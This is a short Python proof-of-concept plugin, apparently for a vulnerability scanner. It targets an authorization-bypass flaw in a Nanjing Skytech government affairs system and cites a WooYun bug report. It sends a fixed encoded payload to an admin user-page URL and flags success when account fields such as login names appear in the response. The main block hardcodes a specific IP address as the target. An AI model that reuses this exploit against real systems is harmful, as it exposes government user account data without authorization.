#!/usr/bin/env python
# -*- coding: utf-8 -*-
#南京擎天政务系统越权
#refer:http://www.wooyun.org/bugs/wooyun-2010-081902
#__author__ = 'xq17'

def assign(service, arg):
    if service == "skytech":
        return True, arg

def audit(arg):
    url = arg
    payload = 'admin/usr_page.aspx?q=%C2%97%C3%BF%C3%81%C2%AC%C3%9C%C3%A5%C2%82%C3%88%C2%98%C3%85%C2%9B%C2%98%C3%86'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'Ctr_Prefix' in res and "Ctr_Loginnam" in res:
        security_info(verify_url)
        security_info(url + payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech','http://58.222.211.21/')[1])
